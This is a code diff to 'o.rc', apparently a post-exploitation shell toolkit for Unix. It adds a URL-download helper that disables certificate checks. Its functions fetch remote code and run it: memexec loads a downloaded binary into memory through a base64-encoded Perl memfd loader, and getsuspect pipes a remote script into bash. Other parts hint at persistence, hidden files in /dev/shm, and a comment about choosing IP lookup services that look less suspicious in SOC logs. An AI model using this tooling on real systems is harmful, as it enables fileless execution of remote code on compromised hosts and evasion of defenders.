@@ -2,7 +2,64 @@
 # o.rc
 OVERSION="0.5"
 # NOTES
-#authors: March, Darren Martyn, Ulrich Bernstien
+#authors: March, Darren Martyn, Ulrich Berntien
+
+# ~~~ Compatibility Layer ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#
+# In the compatiblity layer the functions to handle the differences
+# between different Unix flavors, shell types are collected.
+# Functions outside the compatibility layer call functions in this
+# layer or call tools/programs common for all Unix flavors.
+#
+
+orc_existsProg () {
+  # Checks if a program/command exists.
+  # Argument: Program/command name to check.
+  # Exit status: 0 if one ore more programs do not exists.
+  if [ $# -lt 1 ]; then
+    echo 'Error: missing program name to check.'
+    return 1;
+  fi
+  hash "$@" > /dev/null 2> /dev/null
+  }
+
+orc_loadURL () {
+  # Loads from an URL via curl, wget or perl.
+  # Argument: The URL to download, https is supported.
+  # Output to stdout: The content of the URL document.
+  if [ $# -ne 1 ]; then
+    echo 'Error: argument must be one URL to load'
+    return 1
+  fi
+  if orc_existsProg curl; then
+    curl --silent --location --insecure -- "$1"
+  elif orc_existsProg wget; then
+    wget --quiet --no-check-certificate --output-document=- -- "$1"
+  elif orc_existsProg perl; then
+    perl -e 'use LWP::Simple qw ($ua head get);
+             $url = $ARGV[0];
+             $ua->ssl_opts(verify_hostname => 0,SSL_verify_mode => 0x00);
+             print get $url;
+             ' -- "$1"
+  elif orc_existsProg python; then
+    PYTHONHTTPSVERIFY=0 python -c '
+import sys, urllib2
+request = urllib2.urlopen(sys.argv[1])
+sys.stdout.write(request.read())
+  ' "$1"
+  else
+    echo 'Error: no download tool found'
+    return 1
+  fi
+}
+
+# ~~~ Helper Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#
+# In the section of the internal helper functions are collected.
+# The helper functions are typical not called by the user of o.rc
+# Some user level functions uses the functions and variables defined
+# in the helper functions section.
+#
 
 memfda=$(cat << EOF
 IyEvdXNyL2Jpbi9lbnYgcGVybAp1c2Ugd2FybmluZ3M7CnVzZSBzdHJpY3Q7CgokfD0xOwoKbXkgJG5hbWUgPSAiIjsKbXkgJGZkID0gc3lzY2FsbCgzMTksICRuYW1lLCAxKTsKaWYgKC0xID09ICRmZCkgewoJZGllOwp9CgpwcmludCAiZmQgJGZkXG4iOwoKb3BlbiAobXkgJEZILCAnPiY9Jy4kZmQpIG9yIGRpZTsKc2VsZWN0ICgoc2VsZWN0KCRGSCksICR8PTEpIFswXSk7CgpwcmludCAkRkggcGFjayBxL0gqLywgcS8K
@@ -30,6 +87,11 @@ if [ -r "$ENV" ]; then
   ENV=$(realpath "$ENV")
 fi
 NHOME=""
+
+# ~~~ User Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#
+# The user functions are designed to be called by the o.rc users.
+#
 
 getdbus() {
 echo "Dbus services for system:"
@@ -229,7 +291,7 @@ rm /dev/shm/.q/.c
 }
 
 memexec() {
-memfile=$(curl -s $1 | od --endian=big -An -x | tr -d ' ' | tr -d '\n')
+memfile=$(orc_loadURL "$1" | od --endian=big -An -x | tr -d ' ' | tr -d '\n')
 finalmem=$(echo $memfda | base64 -d)
 finalmem=${finalmem}$(echo -ne "$memfile/ or die;\n")
 finalmem=${finalmem}$(echo $memfdb | base64 -d)
@@ -249,7 +311,7 @@ fi
 getsuspect() {
 #ask and ye shall receive
 #this janky, awful shortcut
-curl https://raw.githubusercontent.com/zMarch/suspect/master/suspect.sh | bash
+orc_loadURL 'https://raw.githubusercontent.com/zMarch/suspect/master/suspect.sh' | bash
 }
 
 keyinstall() {
@@ -315,13 +377,7 @@ getip() {
 #we use akamai and google here because they're gonna look less dodgy in SOC's lolgs
 echo "Attempting to get IP..."
 echo -ne "HTTP says: "
-	if hash curl>/dev/null; then
-	curl -k https://whatismyip.akamai.com
-	echo -ne "\n(used curl)"
-	else
-	wget -qO- --no-check-certificate https://whatismyip.akamai.com
-	echo -ne "\n(used wget)"
-	fi
+	orc_loadURL 'https://whatismyip.akamai.com'
 echo ""
 echo -ne "DNS says: "
 	if hash dig>/dev/null; then
